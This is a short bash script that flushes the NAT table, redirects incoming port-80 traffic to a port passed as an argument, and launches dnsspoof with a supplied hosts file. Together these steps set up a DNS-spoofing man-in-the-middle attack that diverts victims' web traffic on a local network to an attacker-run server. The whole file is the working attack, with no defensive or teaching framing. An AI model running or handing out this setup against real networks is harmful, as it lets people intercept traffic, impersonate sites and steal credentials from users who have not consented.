#!/bin/bash
# $1 --> PORT
# $2 --> DNS_FORWARD_FILE

echo "Removing previous rules from NAT table"
echo "iptables -t nat -F"
sudo iptables -t nat -F
echo ""

echo "Redirecting trafic from port 80 to $1"
echo "iptables -A PREROUTING -t nat -p tcp --dport 80 -j REDIRECT --to-ports $1"
sudo iptables -A PREROUTING -t nat -p tcp --dport 80 -j REDIRECT --to-ports $1
echo ""

echo "Redirecting web traffic"
echo "dnsspoof -f $2"
sudo dnsspoof -f $2
